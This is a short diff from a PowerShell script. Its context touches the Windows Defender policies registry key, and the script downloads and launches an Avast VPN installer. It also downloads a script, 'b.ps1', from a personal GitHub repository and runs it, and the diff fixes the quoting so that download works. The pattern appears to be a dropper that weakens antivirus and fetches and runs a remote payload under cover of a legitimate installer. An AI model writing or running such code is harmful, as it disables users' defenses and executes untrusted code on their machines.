@@ -25,7 +25,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
 Start-Process -FilePath "$extractPath\avast.exe"
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.ps1' -OutFile '$env:USERPROFILE\Desktop\b.ps1'
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.ps1' -OutFile "$env:USERPROFILE\Desktop\b.ps1"
 Start-Process powershell -ArgumentList '-File "$env:USERPROFILE\Desktop\b.ps1"'
 
 for ($i = 1; $i -le 9; $i++) {
